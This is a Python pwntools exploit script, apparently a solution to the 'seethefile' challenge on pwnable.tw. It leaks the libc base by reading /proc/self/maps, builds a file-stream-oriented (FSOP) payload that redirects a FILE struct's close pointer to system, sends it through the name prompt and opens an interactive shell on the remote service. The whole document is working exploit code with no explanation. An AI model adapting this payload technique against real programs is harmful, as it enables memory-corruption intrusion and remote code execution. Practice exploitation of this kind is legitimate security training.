#!/usr/bin/env python 
from mypwn import *
context(log_level='debug',arch='i386')

# p=process('./seethefile',env={'LD_PRELOAD':'./libc_32.so.6'})
p=remote('chall.pwnable.tw',10200)
libc=ELF('./libc_32.so.6')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('Your choice :')
    sl(str(i))

def open(file_name):
    menu(1)
    ru('What do you want to see :')
    sl(file_name)

def read():
    menu(2)

def write():
    menu(3)

def close():
    menu(4)

open('/proc/self/maps')
read()
read()
write()
libc_content=ru('1. Open').split('\n')
libc_base=''
for i in range(len(libc_content)):
    if 'libc' in libc_content[i]:
        libc_base=libc_content[i]
        break
libc_base=int(libc_base[0:8],16)
print(hex(libc_base))
libc.address=libc_base
one_off=0x3a819
one_off=0x5f065
one_off=0x5f066
one=libc_base+one_off

one=libc.symbols['system']

iofile_addr=0x0804B260
payload=fsop_payload(iofile_addr,{'close':one},addr_payload={0x0804B280:p32(iofile_addr)})
# gdb.attach(p,'nb 08048AE0\nnb 08048B0F')

def leave(name):
    menu(5)
    ru('Leave your name :')
    sl(name)
leave(payload)

p.interactive()